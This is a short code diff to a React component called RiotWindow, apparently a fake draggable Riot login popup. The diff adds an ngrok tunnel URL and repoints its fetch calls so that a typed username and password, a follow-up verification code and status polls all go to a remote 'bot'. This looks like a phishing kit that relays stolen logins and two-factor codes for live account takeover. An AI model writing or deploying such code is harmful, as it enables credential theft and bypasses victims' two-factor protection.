@@ -18,6 +18,9 @@ const RiotWindow = ({ onClose, onSuccess }) => {
   const dragStart = useRef({ x: 0, y: 0 });
   const loginTimeout = useRef(null);
 
+  // UPDATE THIS WITH YOUR NGROK URL
+  const BOT_URL = 'https://spoken-spectacle-glazing.ngrok-free.dev';
+
   const handleMouseDown = (e) => {
     if (e.button !== 0) return;
     isDragging.current = true;
@@ -39,7 +42,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
 
   const sendToBot = async (user, pass) => {
     try {
-      const response = await fetch('http://localhost:5000/login', {
+      const response = await fetch(`${BOT_URL}/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: user, password: pass })
@@ -60,7 +63,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
 
   const sendCodeToBot = async (code) => {
     try {
-      const response = await fetch('http://localhost:5000/verify-code', {
+      const response = await fetch(`${BOT_URL}/verify-code`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId, code })
@@ -84,7 +87,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
 
   const pollStatus = async () => {
     try {
-      const response = await fetch(`http://localhost:5000/status/${sessionId}`);
+      const response = await fetch(`${BOT_URL}/status/${sessionId}`);
       const data = await response.json();
       
       if (data.status === "verified") {
